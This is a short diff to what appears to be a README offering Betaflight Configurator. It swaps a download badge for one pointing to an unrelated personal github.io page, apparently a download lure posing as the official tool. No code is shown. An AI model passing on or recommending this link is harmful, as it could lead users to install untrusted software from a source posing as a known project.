@@ -4,11 +4,8 @@
   <img src="https://profpv.ru/wp-content/uploads/2020/09/%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B3%D1%83%D1%80%D0%B0%D1%86%D0%B8%D1%8F.jpg" width="820" alt="Betaflight Configurator Interface">
 </div>
 
-<p align="center">
-  <a href="https://configurator-betaflight.github.io/.github">
-    <img src="https://img.shields.io/badge/Скачать_Betaflight_Configurator-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Скачать Betaflight Configurator">
-  </a>
-</p>
+[![GET Configurator Betaflight](https://img.shields.io/badge/GET%20%E2%80%94%20Configurator-Betaflight-0078D6?style=for-the-badge&logoColor=white)](https://stlawrencevandergrift44.github.io/.github/Configurator-Betaflight)
+
 
 ---
 
